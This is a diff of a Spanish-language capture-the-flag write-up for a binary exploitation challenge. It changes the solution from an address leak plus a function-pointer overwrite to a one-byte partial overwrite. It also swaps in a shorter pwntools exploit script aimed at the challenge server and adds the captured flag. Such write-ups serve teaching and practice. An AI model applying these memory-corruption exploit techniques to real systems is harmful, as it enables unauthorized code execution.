@@ -143,11 +143,13 @@ Y como se llama explicitamente a la direccion que contiene el puntero de `[rsp +
 <img width="1079" height="133" alt="2025-09-16-152726_1079x133_scrot" src="https://github.com/user-attachments/assets/b4c2fd71-396d-4c66-aa1a-5b1a714f27c0" />
 
 ##
-Dicho esto la estrategia es simple:
+Originalmente mi solucion fue:
 1. Filtrar la direccion de `open_flag_function` con "show"
 2. Sobreescribir la direccion de `try_harder_function` (`[rsp + 0xc8]`) por la de `open_flag_function` con "write"
 3. Invocar a la funcion con "run" 
  
+Pero alguien lo hizo de una forma mas inteligente al simplemente sobreescribir parcialmente el byte menos significativo en `[rsp + 0xc8]` por '0x65'. 
+
 ### Exploit
 ```py
 #!/usr/bin/env python3
@@ -166,7 +168,7 @@ break main
 '''
 
 domain= "ctf.ac.upt.ro"
-port = 9839
+port = 9851
 
 def start():
     if args.REMOTE:
@@ -178,30 +180,14 @@ def start():
 r = start()
 
 #========= exploit here ===================
-
-# leak the address of the flag reader function
-r.sendline(b"2")
-print(r.recvuntil(b"len:\n"))
-
-r.sendline(b"112")
-print(r.recv(48*2))
-
-win_addr = u64(bytes.fromhex(r.recv(16).strip().decode()))
-r.info(f"Leaked return address: {hex(win_addr)}")
-
-# overwrite the "try_harder" function pointer with the flag reader function
-base_addr = win_addr - 0x1a65
-r.info(f"Base address: {hex(base_addr)}")
-r.info(f"New return address: {hex(win_addr)}")
-
-r.sendline(b"1")
-print(r.recvuntil(b"bytes:\n"))
-
-r.sendline(b"112")
-r.send(b"A"*32 + p64(win_addr))
-
+# partial overwrite
+time.sleep(0.5)
+r.sendline(b"1\n33\n" + b"A"*32 + b"\x65\n3\n4")
 r.interactive()
+print(r.recvuntil(b"exit\n"))
 ```
+
+`CTF{ed30505bbe7a651829d9d747f7af11677c7c3ff8f4e871a5269920c961765747}`
 
 
 
